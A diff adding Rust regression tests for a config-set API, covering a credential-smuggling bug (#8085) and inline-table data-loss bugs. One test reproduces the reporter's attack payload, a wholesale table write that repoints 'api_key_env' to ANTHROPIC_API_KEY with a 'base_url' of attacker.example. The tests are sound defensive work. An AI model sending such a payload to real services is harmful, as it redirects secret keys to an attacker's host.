@@ -1994,3 +1994,271 @@ async fn metrics_escapes_untrusted_label_values() {
         );
     }
 }
+
+/// #8085: the SCRUB list governed only the path being assigned, so a wholesale
+/// table write smuggled a credential-shaped field past it.
+///
+/// `is_writable_config_path` accepts a write one level below a writable section
+/// prefix, and at that depth the handler assigns the submitted JSON wholesale
+/// (`doc[section][key] = <value>`). `media.custom_stt` ends in neither a
+/// scrubbed name nor `_env`, so the path check passed and the `api_key_env`
+/// member of the posted table landed on disk — repointing the env var a
+/// credential is resolved from, post-auth, over HTTP.
+///
+/// This is the reporter's exact payload. It must be refused, and the refusal
+/// must name the offending key so the caller knows which field to edit on disk.
+#[tokio::test(flavor = "multi_thread")]
+async fn config_set_refuses_a_credential_key_smuggled_inside_a_wholesale_table() {
+    let h = boot_router_with_api_key(API_KEY).await;
+
+    let (status, body) = send(
+        h.app.clone(),
+        auth_post_json(
+            "/api/config/set",
+            serde_json::json!({
+                "path": "media.custom_stt",
+                "value": {
+                    "api_key_env": "ANTHROPIC_API_KEY",
+                    "base_url": "http://attacker.example/"
+                }
+            }),
+        ),
+    )
+    .await;
+
+    assert_eq!(
+        status,
+        StatusCode::FORBIDDEN,
+        "a table carrying `api_key_env` must be refused however innocuous its path looks; \
+         body: {}",
+        String::from_utf8_lossy(&body)
+    );
+    let parsed: serde_json::Value = serde_json::from_slice(&body).expect("json body");
+    let message = parsed
+        .get("error")
+        .and_then(|e| e.as_str())
+        .unwrap_or_default();
+    assert!(
+        message.contains("api_key_env"),
+        "the refusal must name the offending key so the operator knows what to edit on disk, \
+         got: {message}"
+    );
+}
+
+/// The same defect class, one level down and inside an array — a payload can
+/// nest, so the scan has to recurse rather than inspect only the top level.
+#[tokio::test(flavor = "multi_thread")]
+async fn config_set_refuses_a_credential_key_nested_below_the_top_level() {
+    let h = boot_router_with_api_key(API_KEY).await;
+
+    for value in [
+        serde_json::json!({"outer": {"api_key_env": "ANTHROPIC_API_KEY"}}),
+        serde_json::json!([{"token": "hunter2"}]),
+        serde_json::json!({"list": [{"client_secret": "s"}]}),
+    ] {
+        let (status, body) = send(
+            h.app.clone(),
+            auth_post_json(
+                "/api/config/set",
+                serde_json::json!({"path": "media.custom_stt", "value": value}),
+            ),
+        )
+        .await;
+        assert_eq!(
+            status,
+            StatusCode::FORBIDDEN,
+            "nested credential key must be refused; payload {value}, body: {}",
+            String::from_utf8_lossy(&body)
+        );
+    }
+}
+
+/// The fix must not close the legitimate route to the same fields.
+///
+/// A per-leaf write one level deeper is how the dashboard is meant to edit
+/// these sections, and it is still governed by the path check exactly as
+/// before: the non-secret leaf succeeds, and the credential leaf is refused by
+/// the path check rather than the payload scan.
+#[tokio::test(flavor = "multi_thread")]
+async fn config_set_still_allows_a_non_secret_leaf_write_under_the_same_section() {
+    let h = boot_router_with_api_key(API_KEY).await;
+
+    let (status, body) = send(
+        h.app.clone(),
+        auth_post_json(
+            "/api/config/set",
+            serde_json::json!({
+                "path": "media.custom_stt.base_url",
+                "value": "http://localhost:9000/"
+            }),
+        ),
+    )
+    .await;
+    assert_eq!(
+        status,
+        StatusCode::OK,
+        "a per-leaf non-secret write must keep working; body: {}",
+        String::from_utf8_lossy(&body)
+    );
+
+    let (status, _) = send(
+        h.app.clone(),
+        auth_post_json(
+            "/api/config/set",
+            serde_json::json!({
+                "path": "media.custom_stt.api_key_env",
+                "value": "ANTHROPIC_API_KEY"
+            }),
+        ),
+    )
+    .await;
+    assert_eq!(
+        status,
+        StatusCode::FORBIDDEN,
+        "the credential leaf stays closed at its own path, as it was before this change"
+    );
+}
+
+/// A payload with no credential-shaped key anywhere must be unaffected, so the
+/// scan cannot become a blanket ban on object-valued writes.
+#[tokio::test(flavor = "multi_thread")]
+async fn config_set_accepts_a_table_with_no_credential_shaped_key() {
+    let h = boot_router_with_api_key(API_KEY).await;
+
+    let (status, body) = send(
+        h.app.clone(),
+        auth_post_json(
+            "/api/config/set",
+            serde_json::json!({
+                "path": "provider_urls",
+                "value": {"openai": "http://localhost:9001/v1"}
+            }),
+        ),
+    )
+    .await;
+    assert_eq!(
+        status,
+        StatusCode::OK,
+        "a primitive-valued collection write must still be accepted; body: {}",
+        String::from_utf8_lossy(&body)
+    );
+}
+
+/// #8085 follow-up: `toml_edit` models `[media]` and `media = { … }` as
+/// different `Item` variants, and the write path's `contains_table` /
+/// `as_table_mut` guards recognised only the standard-table form.
+///
+/// An operator who hand-wrote a section as an inline table therefore lost it:
+/// editing one leaf judged the section "missing" and replaced it with an empty
+/// table, dropping every sibling key — `api_key_env` among them. That is
+/// reachable precisely because #8085 recommends per-leaf writes as the safe
+/// route for tables that carry credential fields.
+#[tokio::test(flavor = "multi_thread")]
+async fn config_set_preserves_the_siblings_of_a_hand_written_inline_table() {
+    let h = boot_router_with_api_key(API_KEY).await;
+    let config_path = h.home.join("config.toml");
+
+    std::fs::write(
+        &config_path,
+        "[media]\ncustom_stt = { base_url = \"http://old/\", api_key_env = \"MY_STT_KEY\" }\n",
+    )
+    .expect("seed config.toml");
+
+    let (status, body) = send(
+        h.app.clone(),
+        auth_post_json(
+            "/api/config/set",
+            serde_json::json!({
+                "path": "media.custom_stt.base_url",
+                "value": "http://new/"
+            }),
+        ),
+    )
+    .await;
+    assert_eq!(
+        status,
+        StatusCode::OK,
+        "per-leaf write into an inline table must succeed; body: {}",
+        String::from_utf8_lossy(&body)
+    );
+
+    let on_disk = std::fs::read_to_string(&config_path).expect("read back config.toml");
+    assert!(
+        on_disk.contains("http://new/"),
+        "the edited leaf must be written; got:\n{on_disk}"
+    );
+    assert!(
+        on_disk.contains("MY_STT_KEY"),
+        "the sibling credential key must survive a per-leaf edit — this is the \
+         data-loss bug this test exists for; got:\n{on_disk}"
+    );
+}
+
+/// The same defect one level up: a top-level section written inline must not be
+/// wiped by a depth-2 write.
+#[tokio::test(flavor = "multi_thread")]
+async fn config_set_preserves_an_inline_section_on_a_depth_two_write() {
+    let h = boot_router_with_api_key(API_KEY).await;
+    let config_path = h.home.join("config.toml");
+
+    std::fs::write(
+        &config_path,
+        "media = { audio_model = \"whisper-1\", describe_image_model = \"gpt-4o\" }\n",
+    )
+    .expect("seed config.toml");
+
+    let (status, _) = send(
+        h.app.clone(),
+        auth_post_json(
+            "/api/config/set",
+            serde_json::json!({"path": "media.audio_model", "value": "whisper-2"}),
+        ),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK);
+
+    let on_disk = std::fs::read_to_string(&config_path).expect("read back config.toml");
+    assert!(
+        on_disk.contains("whisper-2"),
+        "the edited key must be written; got:\n{on_disk}"
+    );
+    assert!(
+        on_disk.contains("describe_image_model"),
+        "the sibling key must survive; got:\n{on_disk}"
+    );
+}
+
+/// Removal used `as_table_mut`, which is `None` for an inline table, so the key
+/// stayed on disk while the handler still answered success — a delete that
+/// silently did nothing.
+#[tokio::test(flavor = "multi_thread")]
+async fn config_set_null_removes_a_key_from_an_inline_table() {
+    let h = boot_router_with_api_key(API_KEY).await;
+    let config_path = h.home.join("config.toml");
+
+    std::fs::write(
+        &config_path,
+        "media = { audio_model = \"whisper-1\", describe_image_model = \"gpt-4o\" }\n",
+    )
+    .expect("seed config.toml");
+
+    let (status, _) = send(
+        h.app.clone(),
+        auth_post_json(
+            "/api/config/set",
+            serde_json::json!({"path": "media.audio_model", "value": null}),
+        ),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK);
+
+    let on_disk = std::fs::read_to_string(&config_path).expect("read back config.toml");
+    assert!(
+        !on_disk.contains("audio_model"),
+        "a reported-successful removal must actually remove the key; got:\n{on_disk}"
+    );
+    assert!(
+        on_disk.contains("describe_image_model"),
+        "the sibling key must survive the removal; got:\n{on_disk}"
+    );
+}
